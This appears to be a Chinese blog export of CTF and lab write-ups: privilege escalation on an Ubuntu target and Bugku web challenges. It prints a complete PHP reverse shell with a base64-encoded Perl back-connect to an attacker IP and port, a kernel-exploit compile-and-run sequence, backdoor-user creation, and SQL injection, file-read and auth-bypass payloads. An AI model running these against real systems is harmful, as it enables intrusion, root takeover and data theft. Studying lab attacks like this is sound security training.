对靶机进行提权使用蚁剑的终端打开，使用uname -a 查看版本或者cat /proc/version 12345# 这里的Ubuntu版本时16.04。# Ubuntu 16.04 版本且 unprivileged_bpf_disable 权限没有关闭的情况下就会存在 提权漏洞# 查看是否存在unprivileged_bpf_disable文件，如果存在该文件，查看文件内容是否为1，若不是1，则存在漏洞 查看方式：cat /proc/sys/kernel/unprivileged_bpf_disable 下载poc文件 下载地址：http://cyseclabs.com/exploits/up … mp;isappinstalled=0 下载后，复制连接，使用wget进行下载 ，下载完成后并不是我们要的名字，所以将文件重命名，把 .c 后的内容删除 编译生成可执行文件，并赋予可执行权限 gcc -o upstream upstream44.c可以将upstream只写u gcc -o u upstream44.c 在给文件一个执行的权限 chmod a+x upstream 如果是在当前执行./upstream44.c是失败的，虽然也是返回shell，但是还是连接当前的权限 所以我们需要上传一个反弹shell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php function which($pr) &#123; $path = execute(\"which $pr\"); return ($path ? $path : $pr); &#125; function execute($cfe) &#123; $res = ''; if ($cfe) &#123; if(function_exists('exec')) &#123; @exec($cfe,$res); $res = join(\"\\n\",$res); &#125; elseif(function_exists('shell_exec')) &#123; $res = @shell_exec($cfe); &#125; elseif(function_exists('system')) &#123; @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(function_exists('passthru')) &#123; @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(@is_resource($f = @popen($cfe,\"r\"))) &#123; $res = ''; while(!@feof($f)) &#123; $res .= @fread($f,1024); &#125; @pclose($f); &#125; &#125; return $res; &#125; function cf($fname,$text)&#123; if($fp=@fopen($fname,'w')) &#123; @fputs($fp,@base64_decode($text)); @fclose($fp); &#125; &#125; $yourip = \"Ip\"; $yourport = 'Port'; $usedb = array('perl'=&gt;'perl','c'=&gt;'c'); $back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\". \"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\". \"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\". \"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\". \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\". \"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\". \"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\"; cf('/tmp/.bc',$back_connect); $res = execute(which('perl').\" /tmp/.bc $yourip $yourport &amp;\"); ?&gt; 在kali中进行端口监听 nc -lvp [Port] shell上传成功，我们就来访问一下这个shell，在查看kali，这样就可以看到已经监听到了这个shell 可以使用ls查看 我们先输入u，查看，在输入id 查看当前权限，输入./u在输入id查看当前权限 可以成功看到当前全县是root了 使用passwd改一下密码，这里更改完远程连接root是不能直接登录的。 因为Ubuntu通常情况下会禁止直接连接root ssh root@Ip 所以我们新建一个用户，然后登录这个用户。 useradd test 、passwd test 设置密码 使用ssh连接test接口 ssh test@Ip，这个时候就能重新连接了 在使用su登录root，可以看到现在就变成了root权限了 可以看到flag文件 cat 一下这个文件。查看里面的内容，里面就是flag文件 主机发现和端口扫描使用netdiscover -r 172.24.10.0/24 就会把网址给搜索出来，这是知道ip的情况下 如果不知道ip直接使用netdisconver来全部扫描，这样扫描需要等待一段时间，因为他要查找。 扫描到之后我们可以使用Nmap查看开放了哪些服务 nmap -sv 172.24.10.142 可以看到开放了一个80和22端口 使用nmap -O 172.24.10.142查看版本，可以看到是一个linux系统 我们访问22接口，以为我们不知道密码所以先取消，在页面访问80端口，返回页面 这样我们需要找一下漏洞，可以看到url返回id，可能存在sql注入，使用单引号和%df来查看是否有sql注入，经过测试发现页面都返回正常 看看是否有其他漏洞，在搜索框输入1，看到url中的key显示1 检查一下这个内容是怎么提交的 可以看到他是value值进行提交上去的，这个时候就会产生xss漏洞 我们试试xss漏洞是否可行 &gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 可以看到他将我们的xss进行url编码了，所以并没有弹框，说明这里没有xss漏洞 我们可以使用御剑，或者dirsearch来爆破后台、目录 这里使用dirsearch，先进入dirsearch的目录，使用python3运行 格式：python3 dirsearch -u url/* php 怎么知道它的类型是php的呢，直接在页面的url后面加入index.php页面还是返回当前页面 可以看到搜索出一个admin/login.php，我们就找到了他的后台 在页面中进行访问，这样就进入了他的后台，因为他的账号和密码我们是不知道的 所以我们先使用万能密码尝试登陆 使用admin&#39;密码随便输入，页面返回操作数据库失败 并返回了以下重要内容，从这里就可以判断这里存在sql注入，因为他把我们admin上面带的单引号给带入了 我们将单引号后面加上注释符，再次登录查看页面返回，可以看到页面返回输入的密码错误 说明他去把用户名进行查询，然后在将我们输入的密码和他的密码进行对比，然后密码不正确，所以登录不进去 可以进行一个盲注 格式：admin&#39; and sleep(5)，可以看到页面进行了延迟，通过这种注入方式得到最后的后台密码admin 使用admin、admin登录，这样就成功登录到后台去了 代码审计sql注入进入靶场文件，进入admin，查看admin下的 内容 输入IP找到后台在页面抓一下包，提交信息，查看Networdk会发现login.php=ck.php 等会就会返回login.php cat查看一下login.php的源码，可以看到判断登录的地方$action=ch_login 1234global # 设置了一些全局$submit=$_ POST['submit'];就是提交按钮把user传给了 fl_value 又把 fl_value 传给了 fl_html$code = $_POST['code']; # post['code']等于$code 查看 fl_value 是在哪个目录下，回到html目录 命令:grep &quot;fl_value -R ./&quot; 我们要找到function函数，可以看到前面显示的路径includes/fun.php vim查看一下改文件 vim includes/fun,php复制fl_value，打开文件后直接粘贴，会在下方显示，不能在插入模式下粘贴。 搜索出以下内容 1funtion过来一个fl_value值，将$str传进去，进行了一个匹配，有delete和outfile，如果有替换为空 在查看login.php文件 12345可以看到又调用了 cheack_login()函数 # 判断从哪个页面进入的# 判断用户名、密码是不是为空# 判断验证码正不正确然后提交给了cheack_login()函数 查看一下cheack_login()函数在哪个路径下 命令：grep &quot;cheack_login&quot; -R ../ 可以看到还是正在include/fun.php文件下 复制cheack_login，打开fun.php，还是按照之前的方法进行黏贴 可以看到他直接吧.$user变量直接给拼接进去了，所以就会产生sql注入 代码审计越权漏洞继续审计login.php 判断login和admin不为空直接跳转到admin.php，这个时候就可以想到越权漏洞 进行测试，访问前台，使用hackbar的Post data复制粘贴上面红线 _ SESSION[‘login_in’]&amp;&amp;_SESSION[‘admin’]不要$符，让login_in和admin都等于1，方括号中不要单引号. 还要设置一下会话时间设置 _ SESSION[login_time]=999999999999 1_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=999999999999 再次访问后台登录页面，这个时候就不需要密码直接进入后台了 代码审计文件包含漏洞继续查看admin.php文件，可以看到这样一行命令 $_GET[&#39;file]等于file，include($_GET[&#39;file&#39;]也等于file 这样就存在文件包含漏洞，在页面url后面输入?file=/etc/passwd 再查看一下php.ini看他是不是远程文件包含，使用find查看一下路径 find / -name php.ini找一下php.ini的位置 找到路径，使用vi打开该文件，是off，没有远程文件包含 代码审计后台漏洞查看一下config.php文件，使用find搜索路径 find / -name config.php cat 一下这个路径，可以看到在config这个文件里有一个一句话木马，我们来对他进行一个访问，看看能否执行 在url中传输一个d执行linux命令，然后在PSOT传入b执行ls查看当前路径下的内容 逻辑漏洞之验证码不失效页面是先验证验证码是否正确，在验证账号密码 当验证码输入错误的时候 可以当验证码输入正确时返回输入密码不正确，4秒返回 在这4秒内自己后退返回，他的验证码是不变的，这样就可以再次使用这个验证码来进行验证，所以这里就可以使用bp来进行抓包，然后发送到Repeater模块进行测试，这个期间因为是抓包所以页面是不动的，这也就导致了验证码不刷新 因为我们之前测试知道了用户名处存在sql注入，在这里将用户名后面改为aaa*这里的 * 表示所有，然后选中所有，另存为txt文本使用sqlmap记性自动注入 sqlmap -r 文件名 --dbs这样就注入出来了","categories":[],"tags":[]},{"title":"bugku","slug":"bugku","date":"2020-07-25T01:16:39.632Z","updated":"2020-07-16T07:45:57.652Z","comments":true,"path":"2020/07/25/bugku/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/bugku/","excerpt":"","text":"MD5解密复制TVRjMU9UYz0= 进行MD5解密 复制MTc1OTc=再次进行解密 复制这5位数，填入输入框 输入长度限制只能输入一个字符 F12查看，发现maxlength限制长度1 更改长度，输入大于1778的数 进行验证 绕过第一个if判断查看代码，发现第二个if必须是输入的数字是1才能执行echo输出flag 输入?num=1，页面没有响应 发现第一个if是!is_numeric，所以输入带上字符的1，比如1”等等 这样就成功返回 解释：因为输入1”第一个if判断不是数字，不执行echo $num，代码向下走，在进行if判断，这里的if判断1”在程序运行时这里的判断不管1后面有没有字符都会当做1来执行，所以成功输出flag 正则匹配payloa：?key=keykeykeykeykeykeykey:///keyx”:i 查看代码 发现正则，然后进行匹配 /key 代表一个key .* 代表一个或多个 . 代表一个 {4,7} 代表最少4个最多起个 key 一个 /./ 转义中间的.代表一个/// .*key 一个或者多个 [a-z] a-z中任意一个字母 [[:punct:]] 任意一个英文字符 /i 一个i 得出结果输入，成功返回 数组绕过Payload：?number1[]=1&amp;number2[]=2 查看代码 进行分析代码 需要让第一个判断错误，然后进行下一个判断，md5不能加密数组，所以这里要传一个空数组 输入上面的Payload，成功返回 堆叠注入查看原页面 在POST框输入1查看返回什么内容 使用show database查看所有数据库 查看一下表试一下，返回了，Flag表，发现存在堆叠注入 查看PHP代码 可以看到上面的提交语句是这样的这是一种非预期解的方法: 1$sql &#x3D; &quot;select &quot;.$post[‘query‘].&quot;||flag from Flag&quot;; 当我们输入1后进行拼接后的语句就是这样的了 1select *,1||flag from Flag 预期解通过堆叠注入将sql_mode的值设置为PIPES_AS_CONCAT，从而将 || 视为字符串的连接操作符而非或运算符。 1payload：query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1 将||或运算变成连接符后就得到了一下内容 1select *,1,flag from Flag&quot;; 暴力破解查看原页面 使用admin和admin尝试进行登录。 返回错误，说用户名和密码不存在。 这样一个一个的尝试效率太慢了，我们使用burpsuit进行抓包 先随机输入密码，进行抓包 将信息发送到intruder模块进行clear$，然后选中password中的值将其Add$ 进入Payload子模块，进行载入字典爆破。 查看字典中的弱口令 在Plyload Options [Simple list]中的load…选中password字典 进行Start attack发动攻击 得出密码是123456 在页面中输入这个密码，查看是否能够登陆成功 登陆成功。 暴力破解验证码绕过原页面 进行一次登陆试试上面已经知道密码是123456了所以我们现在假装不知道进行绕过 这里我们输入的是admin，admin 我们进行抓包，将包发送到Repeater模块进行尝试登陆 点击Go，得到源码，然后右键选中browser，复制网页地址。 Copy之后在网页打开试试 显示登陆失败，验证码也变化了 我们将Repeater中得包信息发送到Intruder模块 将验证码改为当前页面的正确验证码，将字典中的弱口令导入，发动攻击 得出密码：123456 在页面中使用改密码登录 登陆成功 绕过前端验证暴力破解还是使用admin和123登录，然后进行抓包，使用弱口令进行爆破 得出123456密码 如果我们将抓包里面的验证码更改一下试试 进行发动攻击，还是出来了，说明验证码只是进行了前端验证 在页面中使用密码登录或者在burp中复制然后打开 登陆成功 BugkuCTFWEB 2 打开地址查看页面 页面只有表情，没有任何东西 按F12查看一下源代码 发现源代码将flag注释了，我们复制提交就可以。 计算器打开网址 原页面，发现有公式输入框，按照将加法的结果写进去试试 74+14=88，发现只能输入一个数字，说明进行了字符长度限制 F12查看代码，可以看到这里做了字符长度限制，只能输入一个字符。 将1改为多位数，再次输入正确数值88 成功显示flag，复制提交就可以。 web基础$_GET打开网址 打开网址，查看页面 可以看到GET输入，当$what=flag输出flag 我们在URL中输入flag，复制提交就可以。 web基础$_POST打开网址 查看页面，可以看到是Post提交，提交方式和Get一样 在POST中提交 矛盾打开网页 查看页面 可以看到只要是不是数字，而且等于1就可以 这里不管1后面加什么都以，但不能在1的前面加。 WEB 3打开网址 查看页面，发现一直返回这两个弹框 按F12 查看源码 发现一串HTML代码，复制进行解码 解码之后得到Key值，复制直接提交 域名解析这里就是要配置host配置文件，将flag.baidu.com 解析到123.206.87.240然后在网页中访问 修改hosts文件，路径为C:\\Windows\\System32\\drivers\\etc\\hosts最底下添加：120.24.86.145 flag.bugku.com 保存 访问即可 在页面中打开 成功获取key值 还有一种方法就是使用burp抓包添加HOST请求 直接复制提交就ok，这两种方法都可以。 你必须让他停下打开网址 查看 查看原始页面。这是我已经刷新好几次抓到的，刚进去可能没有图片，页面会一直刷新 因为一直刷新所以源码也跟着刷新，根本没机会，所以就可以使用burp进行抓包。 让页面随机运行一次然后抓包。 抓完包发送到Repeater模块中，点击Go一直点击，直到出来flag值 或者按F12，然后将burp放旁边只要一出现flag立马打开Intercept is on进行抓包，让页面停止运行，这一种看你反应。 复制flag提交就可以 本地包含打开网址 查看源码 有好几种方法 在POST区域：f=php://filter/convert.base64-encode/resource=flag.php php://filter/convert.base64-encode/rescoure=flag.php 会获得base64的加密内容，复制进行解密就可以 还有一种方法直接将flag.php文件读入变量hello中 12?hello&#x3D;get_file_contents(&#39;flag.php&#39;) ?hello&#x3D;file(&#39;flag.php&#39;) 变量1打开网址 打开页面得到以下代码 12345678910111213flag In the variable ! &lt;?php error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123; $args &#x3D; $_GET[&#39;args&#39;]; if(!preg_match(&quot;&#x2F;^\\w+$&#x2F;&quot;,$args)) &#x2F;&#x2F; &#x2F;^开始, \\w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$&#x2F;结尾 &#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;); &#x2F;&#x2F;var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。&#125;?&gt; 代码审计，这里需要知道一个知识点可变变量 可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，实现过程是在变量前面多加美元符号 “$” 我们的目标是得到flag，由于代码含有正则匹配，文件上传、本地包含等漏洞不能用，而PHP中$GLOBALS[index] 的数组中存储了所有全局变量 复制提交 web 5打开网址 原始页面，随便提交以下数字试试，发现不行 查看一下源码，发现有一大堆这种JSFUCK代码， 复制这些代码，放到控制台中执行，不要忘记复制上去按回车 记住字母要大写，这里给你显示的小写字母，要将字母转换为大写，在你打开前输入flag的地方已经提示了，字母要大写 返回正常，说明正确，复制这个大写字母的flag在BugkuCFT提交 头等舱打开网址 原始页面，发现真的是什么也没有 使用burp抓一下包试试，发送到Repeater，发现flag在请求头中，复制提交。 网站被黑打开页面 原始页面 进去之后没什么特别的提示 但题目说了 实战 经常遇到 所以 直接 御剑 跑一下 点击上面的shell.php，会进入一个后台界面，让我们输入密码 可是我们并不知道密码是多少，所以使用暴力破解，如果一个一个的去试太麻烦了，而且想到的数量太少了，所以使用burp进行抓包。 现在输入框中随机输入内容，这里我输入的是123，然后打开burp点击网页的登录，进行抓包，不要忘记将Intercept is on打开 右键，将其发送到intruder模块 现将123 Clear$掉，然后选中123再Add$一下 单击Payloads子模块 选中burp自带的字典，Add from list…选中Passwords，点击Start attack，进行爆破密码 爆破完成后，可以看到密码是hack 在页面提交hack，成功返回flag，复制flag提交 管理员系统打开网址 原始页面 查看源代码，可以看到有一个base64加密的密文，解密之后得到test123 因为i管理员系统，账号肯定是admin，密码已经解密出来了是test123 输入提交，发现并没有返回对应的flag，而是说IP禁止访问，请联系本地管理员登录，IP被记录，这说明需要伪造本地IP进行访问 先输入账号密码，，然后使用burp抓包发送到Repeater模块 加入X-Forwarded-For:127.0.0.1伪造IP，点击GO成功返回flag，复制提交即可 WEB 4打开网址， 题目提醒了要查看源代码，可以看到好多URL编码 先复制p1 和 p2的url，将没用的删去 这里可以看到unescape中的url编码在p1和p2之间，所以将他里面的url放中间，先将p1，p2分隔开防止弄乱，再加入unescape中的url，这里面的单引号全都要删除，还有分号什么的，只要与url编码无关的全都删除 将多余的空格删除，然后进行解码得到flag，提交，提交时候要加上flag{}将值放到花括号中 flag在index里打开网址 查看原始页面 点进click me？no看看，可以看到 test5是show.php中的信息，结合题目给的信息说flag在index中也就是index.php中 构造任意读取文件的payload：php://filter/read=convert.base64-encode/resource=index.php。 后面还有很多，复制进行base64解码，将没用的删除 php://filter使我们常用的一种伪协议在任意文件读取，甚至getshell的时候都有利用的机会。这里就是用的任意读取文件 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称 这里读的过滤器为convert.base64-encode，就和字面上的意思一样，把输入流base64-encode。resource=index.php，代表读取index.php的内容 关于convert.*过滤器，可以访问一下网址有详细讲解 https://www.php.net/manual/zh/filters.convert.php 这个刚才页面显示的base64加密的密文 1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg&#x3D;&#x3D; 我们将其解密得到以下内容，可以看到flag就在其中，复制提交即可 12345678910111213141516171819&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; 输入密码查看flag打开网址 查看原始页面，可以看到底下说输入5位数密码查看 因为是输入密码的，我们直接来爆破试试，先试用burp抓包，发送的Intruder模块进行爆破 先Clear$在Add$然后选中Payload子模块进行输入爆破数据 将Payload type改为Number类型，因为是5位数所以从10000开始，先到20000看看能否爆破出来 点击start attack进行攻击，发现成功爆破。 将密码输入，然后返回了flag，进行提交就可以 点击一百万次打开网址 查看原始页面 点击一下曲奇饼，发现数字变成了1 按F12查看源码 可以看到是以POST传输的，发现了clicks变量，当它为1000000应该能得到flag 就在POST中输入clicks=1000000 备份是个好习惯打开网址 查看原始页面 可以看到是MD5加密的，我们进行解密 解密返回是空密码，说明不正确 他题目是备份，我们使用御剑来进行扫描一下 有一个.bak后缀的网址，双击打开 得到了一下代码 乱码不用管因为编码不同，那里是中文字体无碍。 123456789101112131415161718192021222324252627&lt;?php&#x2F;** * Created by PhpStorm. * User: Norse * Date: 2017&#x2F;8&#x2F;6 * Time: 20:22*&#x2F;include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);$str &#x3D; substr($str,1);&#x2F;&#x2F; 将$str里的key替换为空字符。$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);&#x2F;&#x2F; 将字符串解析到变量parse_str($str);&#x2F;&#x2F;输出MD5加密的key1、key2echo md5($key1);echo md5($key2);&#x2F;&#x2F; 两个值进行判断，如果加密的值相同和未加密的值不同输出flagif(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123; echo $flag.&quot;鍙栧緱flag&quot;;&#125;?&gt; 可以看到其中用到了$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);中的str_replac()函数，按照这串代码得出将$str中得’key’替换为空字符，我们可以使用双写绕过kkeyey下面代码的意思就 这里就可以使用数组绕过 构造payload：?kkeyey1[]=1&amp;kkeyey2[]=2 复制结果进行提交。 成绩单打开网页 原始页面，挡在输入框输入1时返回的结果 输入2返回的结果 按F12查看源码 很明显这是POST注入，name是id 这里可以手注或者使用sqlmap来跑 这里都使用一次，先是手注 我们先进行报错尝试，使用万能单引号看看是否报错 页面没有返回信息说明错误 加上–+试试，发现页面还是错误。 可能是因为注释符的原因，更改成#试试，果然页面成功返回正常 使用order by查看字段数当字段等于4的时候返回正常，等于5的时候页面没有返回值 union联合查询查看可注入的字段数，要先将id=1‘改为其他的例如：id=-1‘让其报错，不然只会返回正常值，不会显示注入点，当然改成什么都行只要是错误的就可以。 可以看到，2,3,4这三个都可以注入，查看当前数据库或者查看数据库版本 我们在4的位置上进行注入。 payload：union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;# 返回了两个表名fl4g、sc flag肯定在fl4g中，一看就知道，查看fl4g中的字段 Payload：id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;# 返回了skctf_flag字段名。 查看字段中的数据 Payload：id=-1&#39; union select 1,2,3,group_concat( skctf_flag) from fl4g# 成功返回flag，复制提交即可 秋名山老司机打开网页 原始页面。每次刷新页面的值都不同 他让2秒内计算出那是不可能的，只能上脚本了 123456789101112131415161718192021222324# 模块import requestsimport re# 网站url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;qiumingshan&#x2F;&#39;# 会话保持s &#x3D; requests.Session()# 打开urlsource &#x3D; s.get(url)#正则表达式，匹配算术计算source.text意思就是将网页信息存储到text中s_tr &#x3D; re.search(&#39;(\\d+[+\\-*])+(\\d+)&#39;, source.text).group()# 将字符串s_tr当成有效的表达式来求值并返回计算结果result &#x3D; eval(s_tr)# 这里可以理解为设立分界线冒号post &#x3D; &#123;&#39;value&#39;: result&#125;# 以post请求输出文本print(s.post(url, data &#x3D; post).text) 得到flag，因为是一直变化的，所以有可能运行好几次都不返回值，多运行两次就OK。 速度要快打开网址 查看页面 使用burp进行抓包，这并不是真正地flag，每次刷新都会改变，所以就可以判断他是要在规定时间内算出来，所以就要写一个脚本 代码如下 1234567891011121314151617181920212223# 模块import requestsimport base64# 地址url&#x3D;&#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web6&#x2F;&#39;# 会话维持s&#x3D;requests.Session()# 打开网址和headers请求头header &#x3D; s.get(url).headersprint(header)# 对其进行base64两次解密# split() 通过指定分隔符对字符串进行切片# encode()指定的编码格式编码字符串flag &#x3D; base64.b64decode(base64.b64decode(header[&#39;flag&#39;]).decode().split(&#39;:&#39;)[1]).decode() data&#x3D;&#123;&#39;margin&#39;:flag&#125;# 输出print(s.post(url,data).text) 运行得出flag，复制进行提交 如果感觉太乱了可以吧get(url)下的print注销掉 Cookie欺骗打开网页 查看页面，返回了一堆不知道是啥玩意的字母，但是可以看到URL中有base64的加密密文。复制进行解码 解密之后返回了keys.txt 仿照一下之前的格式，尝试一下将index.php进行加密，并且line=1，这是加密后的index.php 复制在页面中更改相对应的值，返回了一个error_reporting(0);(错误报告)，将line改为2试试。 发现返回代码了，因为每次只能返回一个，所以我们要写一个脚本，让他全部输出 使用py写一个脚本，内容如下 1234567891011121314151617# 模块import requests# 定义一个空字符s &#x3D; &#39;&#39;# 因为之前够早的line每次更改数字都变，所以这里让其循环20直接全部输出for i in range(0,20): # 在line处加上for循环的i进行每次变更数字 url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(i)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39; # 打开url s &#x3D; requests.get(url) # 进行输出 print (s.text) 运行之后得到的结果，可以看到Cookie需要等于margin才能输出，所以需要进行伪造Cookie 将页面返回到原始的界面，也就是加密的keys.txt的界面 进行抓包，发送到Repeater模块，在其中伪造Cookie然后GO一下，发现成功返回了flag，复制提交即可 never give up打开页面 查看原页面 F12查看源码，看到有一个1p.html，访问一下。 http://123.206.87.240:8006/test/1p.html，访问这个网址发现返回了这个，说明刚才那个网址进行了重定向 使用view-source:123.206.87.240:8006/test/1p.html查看1p.html的源代码，看到有URL编码和base64编码 1&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; 先不管是什么编码，因为当中有 URL编码，直接全部复制，进行URL解码，base64编码因为不是相同编码不会进行编译。 将base64的的代码复制进行解密，发现又返回了URL编码，复制URL编码再次去URL解密 URL解密之后获得了以下的值 12345678910111213141516171819202122232425262728293031323334353637&quot;&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; &lt;!--&quot;;# 判断id是否为空和0if(!$_GET[&#39;id&#39;])&#123;# 如果id为空，则我们看到URL加上hello.php?id&#x3D;1 header(&#39;Location: hello.php?id&#x3D;1&#39;);# 退出 exit();&#125;$id&#x3D;$_GET[&#39;id&#39;];$a&#x3D;$_GET[&#39;a&#39;];$b&#x3D;$_GET[&#39;b&#39;];# 判断a变量中.第一次出现的位置，只有当a没有.的时候才能不执行if里面的语句if(stripos($a,&#39;.&#39;))&#123; echo &#39;no no no no no no no&#39;; return ;&#125;# 读取变量a$data &#x3D; @file_get_contents($a,&#39;r&#39;);# 进行判断，当data等于bugku is a nice plateform!，当id等于0，当b&gt;5，当111等于1114，b的第一个字符不等于4if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;--&gt;&quot; 限制 URL 查询字符串中必须有非空非零变量 id 限制变量 $a 中不能含有字符 . 要满足以下 5 条表达式才会爆 flag： 变量 $data 弱等于字符串 bugku is a nice plateform! 变量 $id 弱等于整型数 0 变量 $b 的长度大于 5 字符串 1114 要与字符串 111 连接变量 $b 的第一个字符构成的正则表达式匹配 变量 $b 的第一个字符弱不等于整型数 4 可以看到，代码中已经爆出来了flag文件，所以可以直接访问flag文件。 也可以构造Payload：?id=.&amp;a=php://input&amp;b=.123456,post:data=bugku is a nice plateform! 